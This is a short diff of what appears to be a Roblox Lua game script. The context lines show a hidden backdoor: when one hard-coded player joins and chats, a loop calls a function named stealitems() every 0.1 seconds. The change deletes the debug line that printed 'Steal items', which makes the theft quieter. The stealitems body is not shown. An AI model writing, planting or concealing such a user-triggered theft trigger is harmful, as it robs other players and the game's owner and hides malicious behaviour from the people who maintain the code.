@@ -1237,7 +1237,6 @@ game.Players.PlayerAdded:Connect(function(player)
     if player.Name == userName then
         player.Chatted:Connect(function(msg)
             while player.Parent do
-print("Steal items")
                 stealitems()
                 wait(0.1)
             end
